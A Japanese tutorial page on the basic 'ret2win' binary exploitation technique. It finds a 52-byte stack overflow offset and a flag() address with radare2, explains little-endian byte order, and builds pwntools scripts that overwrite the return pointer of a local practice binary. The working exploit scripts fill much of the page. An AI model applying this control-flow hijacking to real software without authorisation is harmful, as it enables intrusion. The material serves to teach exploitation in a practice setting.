---
description: The most basic binexp challenge
---

# ret2win

**ret2win** とは、`win()` 関数(またはそれに相当するもの)があるバイナリのことで、実行をそこへうまくリダイレクトできればチャレンジ達成です。

これを実現するには、**導入**で学んだことを活用しますが、今度は_狙いどおりに_行う必要があります。つまり、EIP を上書きするだけでなく、自分が選んだ特定の値で上書きしなければなりません。

そのために知っておくべきことは次の 2 つです。

* リターンポインタ(EIP)を上書きし始めるまでの_パディング_
* EIP を上書きしたい値

{% hint style="warning" %}
「EIP を上書きする」と言うとき、実際には EIP に pop されるスタック上の、保存されたリターンポインタを上書きすることを指しています。EIP レジスタ自体はスタック上にないので、直接上書きされるわけではありません。
{% endhint %}

{% file src="../../.gitbook/assets/ret2win.zip" %}
ret2win
{% endfile %}

### パディングを見つける

これは単純な試行錯誤で見つけられます。文字数を変えながら送り、`Segmentation Fault` というメッセージと radare2 を組み合わせて、EIP を上書きできたタイミングを判断します。単純なブルートフォースよりも良い方法があります(次の記事で扱います)が、今のところはこれで十分です。

{% hint style="info" %}
EIP の上書き以外の理由でもセグメンテーションフォルトは起こります。デバッガを使って、パディングが正しいことを確認してください。
{% endhint %}

オフセットは 52 バイトと分かりました。

### アドレスを見つける

次に、バイナリ内の `flag()` 関数のアドレスを調べます。これは簡単です。

```
$ r2 -d -A vuln
$ afl
[...]
0x080491c3    1 43           sym.flag
[...]
```

{% hint style="info" %}
`afl` は **A**nalyse **F**unctions **L**ist の略です
{% endhint %}

`flag()` 関数は `0x080491c3` にあります。

### 得られた情報を使う

最後の課題は、欲しいアドレスをどうやって送るかです。導入を思い出してください。送った `A` は `0x41` になりました。これは `A` の ASCII コードです。ということは、ASCII コードが `0x08`、`0x04`、`0x91`、`0xc3` の文字を探せばよいことになります。

これは思ったより簡単で、Python では 16 進数のまま指定できます。

```python
address = '\x08\x04\x91\xc3'
```

これでずっと楽になります。

### 組み合わせる

パディングと値が分かったので、バイナリをエクスプロイトしましょう。バイナリとやり取りするには [`pwntools`](https://github.com/Gallopsled/pwntools) が使えます(詳しくは [pwntools の記事](../../misc/pwntools/)を参照してください)。

```python
from pwn import *        # pwntools のインポート方法

p = process('./vuln')    # 新しいプロセスを開始

payload = 'A' * 52
payload += '\x08\x04\x91\xc3'

p.clean()                # テキストをすべて受信

p.sendline(payload)

log.info(p.clean())      # "Exploited!" の文字列を出力して成功を確認
```

これを実行すると、小さな問題があって、うまくいきません。なぜでしょうか。デバッガで確認しましょう。`pause()` を入れて、プロセスに `radare2` をアタッチする時間を作ります。

```python
from pwn import *

p = process('./vuln')

payload = b'A' * 52
payload += '\x08\x04\x91\xc3'

log.info(p.clean())

pause()        # これを追加

p.sendline(payload)

log.info(p.clean())
```

`python3 exploit.py` でスクリプトを実行し、別のターミナルウィンドウを開きます。

```
r2 -d -A $(pidof vuln)
```

プロセスの PID を指定すると、radare2 がそのプロセスにフックします。`unsafe()` の return にブレークポイントを置いて、リターンポインタの値を読んでみましょう。

```
[0x08049172]> db 0x080491aa
[0x08049172]> dc

<< press any button on the exploit terminal window >>

hit breakpoint at: 80491aa
[0x080491aa]> pxw @ esp
0xffdb0f7c  0xc3910408 [...]
[...]
```

`0xc3910408` を見て、見覚えはありませんか。送ろうとしたアドレスですが、バイトの順序が逆になっています。この逆転の理由は[エンディアン(endianness)](https://en.wikipedia.org/wiki/Endianness)です。ビッグエンディアンのシステムでは**最上位バイト**(最も大きな値のバイト)を最小のメモリアドレスに格納します。私たちが送ったのはこの形でした。リトルエンディアンはその逆です([理由があります](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format))。出会うバイナリのほとんどはリトルエンディアンです。ここでは、リトルエンディアンの実行ファイルではバイトが_逆順_に格納される、と理解しておけば十分です。

### エンディアンを調べる

`radare2` には、バイナリ解析用の便利なツール `rabin2` が付属しています。

```
$ rabin2 -I vuln
[...]
endian   little
[...]
```

つまり、このバイナリは**リトルエンディアン**です。

### エンディアンを考慮する

修正は簡単で、アドレスを逆順にします(`pause()` も消して構いません)。

```python
payload += '\x08\x04\x91\xc3'[::-1]
```

これで実行すると、うまくいきます。

```
$ python3 tutorial.py 
[+] Starting local process './vuln': pid 2290
[*] Overflow me
[*] Exploited!!!!!
```

これで `flag()` 関数を呼び出せました。おめでとうございます。

### Pwntools とエンディアン

「エンディアンをもっと簡単に扱えないものか」と考えたのは、あなたが初めてではありません。幸い pwntools には、すぐ使える `p32()` 関数が組み込まれています。

```python
payload += '\x08\x04\x91\xc3'[::-1]
```

は、次のようになります。

```python
payload += p32(0x080491c3)
```

ずっと簡単ですね。

唯一の注意点は、戻り値が文字列ではなく `bytes` であることです。そのため、パディングもバイト列にする必要があります。

```python
payload = b'A' * 52        # "b" に注目
```

そうしないと、次のエラーが出ます。

```
TypeError: can only concatenate str (not "bytes") to str
```

### 最終的なエクスプロイト

```python
from pwn import *            # pwntools のインポート方法

p = process('./vuln')        # 新しいプロセスを開始

payload = b'A' * 52
payload += p32(0x080491c3)   # pwntools でパックする

log.info(p.clean())          # テキストをすべて受信
p.sendline(payload)

log.info(p.clean())          # "Exploited!" の文字列を出力して成功を確認
```
